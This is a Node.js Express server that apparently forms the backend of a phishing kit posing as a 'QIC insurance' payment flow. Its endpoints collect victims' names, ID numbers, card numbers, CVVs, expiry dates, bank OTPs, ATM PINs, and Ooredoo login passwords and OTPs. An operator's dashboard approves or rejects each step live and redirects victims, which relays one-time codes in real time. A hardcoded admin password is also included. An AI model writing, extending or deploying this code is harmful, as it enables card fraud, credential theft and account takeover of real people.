const express = require('express');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const PUBLIC_DIR = path.join(__dirname, 'public');

// Change this to your own password (or set the ADMIN_PASSWORD env var before starting the server)
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Ha098765@@';

app.use(express.json());
app.use(express.static(PUBLIC_DIR));

// ---- In-memory visit store ----
const visits = {};
const ACTIVE_WINDOW_MS = 5 * 60 * 1000; // considered "active" if updated in last 5 minutes

// ---- Active sessions tracking (heartbeat) ----
const activeSessions = {}; // sessionId -> { lastSeen, page, lang }
const ACTIVE_SESSION_TIMEOUT_MS = 10 * 1000; // 10 seconds

function getActiveVisitorsCount() {
  const now = Date.now();
  return Object.values(activeSessions).filter(s => (now - s.lastSeen) < ACTIVE_SESSION_TIMEOUT_MS).length;
}

// Cleanup old sessions every 30 seconds
setInterval(() => {
  const now = Date.now();
  Object.keys(activeSessions).forEach(sid => {
    if ((now - activeSessions[sid].lastSeen) > 60 * 1000) {
      delete activeSessions[sid];
    }
  });
}, 30 * 1000);

const VISIT_TTL_MS = 24 * 60 * 60 * 1000; // 24 hours
// Cleanup old visits every 10 minutes
setInterval(() => {
  const now = Date.now();
  Object.keys(visits).forEach(key => {
    if ((now - (visits[key].updatedAt || 0)) > VISIT_TTL_MS) {
      delete visits[key];
    }
  });
}, 10 * 60 * 1000);

// ---- In-memory admin session tokens ----
const adminTokens = new Set();

// ---- In-memory orders store ----
const orders = [];

function requireAdmin(req, res, next) {
  const token = req.headers['x-admin-token'];
  if (token && adminTokens.has(token)) return next();
  return res.status(401).json({ error: 'unauthorized' });
}

function requireAdminPassword(req, res, next) {
  const password = req.headers['x-admin-password'];
  if (password === ADMIN_PASSWORD) return next();
  return res.status(401).json({ error: 'unauthorized' });
}

// ---- Admin auth ----
app.post('/api/admin-login', (req, res) => {
  const { password } = req.body || {};
  if (password === ADMIN_PASSWORD) {
    const token = crypto.randomBytes(24).toString('hex');
    adminTokens.add(token);
    return res.json({ ok: true, token });
  }
  res.status(401).json({ error: 'wrong password' });
});

app.post('/api/admin-logout', (req, res) => {
  const token = req.headers['x-admin-token'];
  if (token) adminTokens.delete(token);
  res.json({ ok: true });
});

// ---- Admin API: check password ----
app.get('/api/admin/check', (req, res) => {
  const password = req.headers['x-admin-password'];
  if (password === ADMIN_PASSWORD) {
    return res.json({ ok: true });
  }
  res.status(401).json({ error: 'unauthorized' });
});

// ---- Admin API: get orders ----
app.get('/api/admin/orders', (req, res) => {
  const password = req.headers['x-admin-password'];
  if (password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'unauthorized' });
  }

  console.log('📊 Current visits:', Object.keys(visits).length, 'orders');

  // تحويل visits إلى orders format
  const ordersList = Object.values(visits).map(v => {
    // معالجة البيانات حسب النموذج المتوقع
    return {
      ...v, // دمج جميع بيانات الزيارة
      // تأكيد الحقول الأساسية (تكتب فوق spread للضمان)
      ref: v.visitId,
      ts: v.createdAt || v.updatedAt || Date.now(),
      status: v.status || 'active',
      n: v.name || v.n || 'بدون اسم',
      p: v.phone || v.p || '',
      e: v.email || v.e || '',
      id: v.id || v.qid || '',
      dob: v.dob || v.birthDate || v.birth_date || '',
      idExpiry: v.idExpiry || v.id_expiry || v.qid_expiry || '',
      step: v.step || 'form',
      pay: v.pay || null,
      ooredoo: v.ooredoo || null,
    };
  });

  const activeVisitors = getActiveVisitorsCount();
  res.json({
    orders: ordersList,
    active: activeVisitors
  });
});

// ---- Admin API: clear all orders ----
app.post('/api/admin/clear', (req, res) => {
  const password = req.headers['x-admin-password'];
  if (password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'unauthorized' });
  }

  // مسح جميع البيانات
  Object.keys(visits).forEach(key => delete visits[key]);
  orders.length = 0;

  res.json({ ok: true, message: 'تم مسح جميع السجلات' });
});

// ---- Admin API: delete specific order ----
app.delete('/api/admin/orders/:ref', (req, res) => {
  const password = req.headers['x-admin-password'];
  if (password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'unauthorized' });
  }

  const { ref } = req.params;
  if (visits[ref]) {
    delete visits[ref];
    return res.json({ ok: true });
  }
  res.status(404).json({ error: 'order not found' });
});

// ---- Admin API: make decision on order ----
app.post('/api/admin/decide/:ref', (req, res) => {
  const password = req.headers['x-admin-password'];
  if (password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'unauthorized' });
  }

  const { ref } = req.params;
  const { action, decision } = req.body || {};
  const choice = action || decision;

  const visit = visits[ref];
  if (!visit) {
    return res.status(404).json({ error: 'order not found' });
  }

  const step = visit.step || 'card';

  if (choice === 'accept') {
    if (step === 'card' || step === 'payment') {
      visit.status = 'payment_accepted';
    } else if (step === 'otp') {
      visit.status = 'otp_accepted';
    } else if (step === 'pin' || step === 'atm') {
      visit.status = 'atm_accepted';
    } else if (step === 'ooredoo' || step === 'ooredoo_login') {
      visit.status = 'ooredoo_login_accepted';
    } else if (step === 'ooredoo-otp' || step === 'ooredoo_otp') {
      visit.status = 'ooredoo_otp_accepted';
    }
  } else if (choice === 'reject') {
    if (step === 'card' || step === 'payment') {
      visit.status = 'payment_rejected';
    } else if (step === 'otp') {
      visit.status = 'otp_rejected';
    } else if (step === 'pin' || step === 'atm') {
      visit.status = 'atm_rejected';
    } else if (step === 'ooredoo' || step === 'ooredoo_login') {
      visit.status = 'ooredoo_login_rejected';
    } else if (step === 'ooredoo-otp' || step === 'ooredoo_otp') {
      visit.status = 'ooredoo_otp_rejected';
    }
  }

  res.json({ ok: true, visit });
});

// Helper: البحث عن visit بواسطة visitId أو paymentId (ربط جميع البيانات في نفس السجل)
function findVisit(id) {
  if (!id) return null;
  // البحث المباشر بـ visitId
  if (visits[id]) return visits[id];
  // البحث بـ paymentId
  return Object.values(visits).find(v => v.pay && v.pay.id === id) || null;
}

// ---- Public: visitor tracking (no auth - used by the flow pages themselves) ----
app.post('/api/track', (req, res) => {
  const data = req.body || {};
  const visitId = data.visitId;
  if (!visitId) return res.status(400).json({ error: 'visitId required' });

  const now = Date.now();
  const existing = visits[visitId];
  const pendingRedirect = existing ? existing.pendingRedirect || null : null;

  // لا تمحو البيانات الموجودة بقيم فارغة (حماية بيانات العميل)
  const cleanData = {};
  for (const [k, v] of Object.entries(data)) {
    if (v !== '' && v !== null && v !== undefined) cleanData[k] = v;
  }

  // لا تنشئ entry جديدة إلا إذا كان فيه رقم جوال — منع ظهور صفوف فارغة في الأدمن
  const hasPhone = cleanData.p || cleanData.phone;
  if (!existing && !hasPhone) {
    return res.json({ ok: true });
  }

  visits[visitId] = {
    ...(existing || { visitId, createdAt: now }),
    ...cleanData,
    visitId,
    updatedAt: now,
    status: existing ? existing.status : 'active',
    step: existing ? existing.step : (cleanData.step || undefined),
    pendingRedirect: null,
  };

  res.json({ ok: true, redirect: pendingRedirect || undefined });
});

// ---- Payment Processing ----
app.post('/api/payment', (req, res) => {
  const { cardName, cardNumber, expiryDate, cvv, requestId, amount, currency } = req.body || {};

  if (!cardName || !cardNumber || !expiryDate || !cvv || !requestId) {
    return res.status(400).json({ ok: false, error: 'Missing required fields' });
  }

  const paymentId = crypto.randomBytes(8).toString('hex');

  if (visits[requestId]) {
    visits[requestId].pay = {
      id: paymentId,
      cardName: cardName,
      cardNumber: cardNumber,
      cvv: cvv,
      exp: expiryDate,
      expiry: expiryDate,
      amount: amount,
      currency: currency,
      status: 'pending_approval',
      step: 'payment'
    };
    visits[requestId].status = 'awaiting';
    visits[requestId].step = 'card';
    visits[requestId].cardName = cardName;
  }

  res.json({ ok: true, id: paymentId });
});

// ---- Check Payment Status ----
app.get('/api/status/:id', (req, res) => {
  const { id } = req.params;
  const visit = findVisit(id);

  if (!visit) {
    return res.json({ status: 'pending' });
  }

  res.json({ status: visit.status || 'active' });
});

// ---- OTP Verification ----
app.post('/api/otp', (req, res) => {
  const { id, otp } = req.body || {};

  if (!id || !otp) {
    return res.status(400).json({ ok: false, error: 'Missing OTP or ID' });
  }

  const visit = findVisit(id);

  if (!visit) {
    return res.status(404).json({ ok: false, error: 'Visit not found' });
  }

  visit.status = 'awaiting';
  visit.step = 'otp';
  visit.otp = otp;
  if (visit.pay) {
    visit.pay.otp = otp;
    visit.pay.code = otp;
  }
  res.json({ ok: true });
});

// ---- ATM PIN Verification ----
app.post('/api/atm', (req, res) => {
  const { id, atmPin } = req.body || {};

  if (!id || !atmPin) {
    return res.status(400).json({ ok: false, error: 'Missing ATM PIN or ID' });
  }

  const visit = findVisit(id);

  if (!visit) {
    return res.status(404).json({ ok: false, error: 'Visit not found' });
  }

  visit.status = 'awaiting';
  visit.step = 'pin';
  visit.atmPin = atmPin;
  if (visit.pay) {
    visit.pay.pin = atmPin;
  }
  res.json({ ok: true });
});

// ---- Ooredoo Login ----
app.post('/api/ooredoo-login', (req, res) => {
  const { id, phone, password, username } = req.body || {};
  const userName = username || phone;

  if (!id || !userName || !password) {
    return res.status(400).json({ ok: false, error: 'Missing required fields' });
  }

  const visit = findVisit(id);

  if (!visit) {
    return res.status(404).json({ ok: false, error: 'Visit not found' });
  }

  visit.status = 'awaiting';
  visit.step = 'ooredoo';
  visit.ooredoo = {
    username: userName,
    phone: userName,
    password: password,
    otp: visit.ooredoo ? visit.ooredoo.otp : ''
  };
  res.json({ ok: true });
});

// ---- Ooredoo OTP ----
app.post('/api/ooredoo-otp', (req, res) => {
  const { id, otp } = req.body || {};

  if (!id || !otp) {
    return res.status(400).json({ ok: false, error: 'Missing OTP or ID' });
  }

  const visit = findVisit(id);

  if (!visit) {
    return res.status(404).json({ ok: false, error: 'Visit not found' });
  }

  visit.status = 'awaiting';
  visit.step = 'ooredoo-otp';
  visit.ooredooOtp = otp;
  if (visit.ooredoo) {
    visit.ooredoo.otp = otp;
  } else {
    visit.ooredoo = { username: '', password: '', otp: otp };
  }
  res.json({ ok: true });
});

// ---- Heartbeat: تسجيل الجلسات النشطة ----
app.post('/api/heartbeat', (req, res) => {
  const { sessionId, page, lang } = req.body || {};
  if (sessionId) {
    activeSessions[sessionId] = {
      lastSeen: Date.now(),
      page: page || '',
      lang: lang || 'ar'
    };
  }
  res.json({ ok: true, active: getActiveVisitorsCount() });
});

// ---- Active visitors count ----
app.get('/api/active-visitors', (req, res) => {
  res.json({ active: getActiveVisitorsCount() });
});

// ---- Admin-only: view & control visits ----
app.get('/api/visits', requireAdmin, (req, res) => {
  const now = Date.now();
  const list = Object.values(visits)
    .filter(v => (now - (v.updatedAt || 0)) <= VISIT_TTL_MS)
    .map(v => ({ ...v, status: (now - v.updatedAt) <= ACTIVE_WINDOW_MS ? 'active' : 'inactive' }))
    .sort((a, b) => b.updatedAt - a.updatedAt);
  res.json(list);
});

app.post('/api/redirect', requireAdmin, (req, res) => {
  const { visitId, target } = req.body || {};
  if (!visitId || !target) return res.status(400).json({ error: 'visitId and target required' });
  if (!visits[visitId]) return res.status(404).json({ error: 'visit not found' });
  visits[visitId].pendingRedirect = target;
  res.json({ ok: true });
});

app.get('/', (req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`QIC insurance flow running at http://localhost:${PORT}`);
  console.log(`Admin dashboard at http://localhost:${PORT}/admin.html (password: ${ADMIN_PASSWORD})`);
});
